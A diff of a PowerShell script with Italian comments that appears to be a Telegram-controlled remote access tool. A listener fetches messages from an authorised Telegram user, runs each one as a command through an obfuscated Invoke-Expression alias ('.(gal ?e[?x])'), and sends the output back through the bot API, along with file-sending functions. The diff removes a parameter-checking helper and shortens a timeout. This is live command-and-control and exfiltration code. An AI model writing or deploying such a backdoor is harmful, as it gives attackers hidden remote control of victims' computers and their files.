@@ -73,8 +73,6 @@ function SendFile($filePath)
 
 function SendMessage($output, $cmd)
 {
-    if ($cmd = "") {$cmd = "None"}
-    
     # To escape _*``[\
     $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
 
@@ -94,46 +92,10 @@ function SendMessage($output, $cmd)
     } catch { Start-Sleep -Seconds 3 }
 }
 
-function CheckRequiredParameters($CommandString)
-{
-    # Dividi la stringa del comando in un array di parole
-    $commandParts = $CommandString -split ' '
-
-    # Il primo elemento è il nome del comando
-    $commandName = $commandParts[0]
-
-    # Verifica se il comando è un alias
-    if ((Get-Command -Name $commandName).CommandType -eq "Alias") {
-        # Recupera il comando associato all'alias
-        $commandName = (Get-Alias -Name $commandName).Definition
-    }
-
-    # Verifica se è un cmdlet
-    if ((Get-Command -Name $commandName).CommandType -eq 'Cmdlet') {
-        # Ottengo i parametri obbligatori per il comando
-        $requiredParameters = Get-Help -Name $commandName -Parameter * -ErrorAction SilentlyContinue | Where-Object { $_.Required -eq $true -and $_.Position -eq 0 } | Select-Object -ExpandProperty Name
-        if ($requiredParameters.Count -eq 0) { return $true }
-
-        # Restringo l'array agli argomenti (escludendo il nome del comando)
-        $arguments = $commandParts[1..$($commandParts.Count - 1)]
-
-        # Estraggo i nomi dei parametri dagli argomenti
-        $parameterNames = $arguments -match '^[-/]([\w]+)[:=]?' | ForEach-Object { $_ -replace '^[-/]|[:=]$' }
-
-        # Verifico se i parametri obbligatori sono presenti tra i nomi dei parametri
-        $missingParameters = $requiredParameters | Where-Object { $_ -notin $parameterNames }
-
-        if ($missingParameters.Count -gt 0) {
-            SendMessage "Il comando '$commandName' richiede i seguenti parametri obbligatori mancanti: $($missingParameters -join ', ')"
-            return $false
-        } else { return $true }
-    } else { return $true }
-}
-
 # Funzione per controllare la raggiungibilità del sito
 function TestTelegramAPI {
     try { 
-        Invoke-RestMethod -Uri $api_get_me -TimeoutSec 10 -ErrorAction Stop | Out-Null
+        Invoke-RestMethod -Uri $api_get_me -TimeoutSec 3 -ErrorAction Stop | Out-Null
         return $true 
     } 
     catch { return $false }
@@ -202,17 +164,13 @@ function CommandListener
                     if ($user_id -match $telegram_id) {
                         if ($text.Length -gt 0) {
                             try {
-                                # Se il messaggio ricevuto non ha parametri obbligatori esegue il comando all'interno del messaggio altrimenti viene skippato
-                                if (CheckRequiredParameters $text) {
-                                    # Verifica se il comando indica a powershell di spostarsi in un'altra cartella da quella in cui è attualmente
-                                    $change_location_check = $text -split ' ' | Select-Object -First 1
-                                    if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
-                                    # Esegue l'istruzione
-                                    #$output = Invoke-Expression -Command $text | Out-String
-                                    $output = .(gal ?e[?x])($text) | Out-String
-                                } 
-                                else { continue }
-                            } catch { $output = $Error[0] | Out-String }
+                                # Verifica se il comando indica a powershell di spostarsi in un'altra cartella da quella in cui è attualmente
+                                $change_location_check = $text -split ' ' | Select-Object -First 1
+                                if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
+                                # Esegue l'istruzione
+                                $output = .(gal ?e[?x])($text) | Out-String
+                            } 
+                            catch { $output = $Error[0] | Out-String }
 
                             # Suddivide l'output in blocchi più piccoli per evitare limiti di dimensione
                             $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
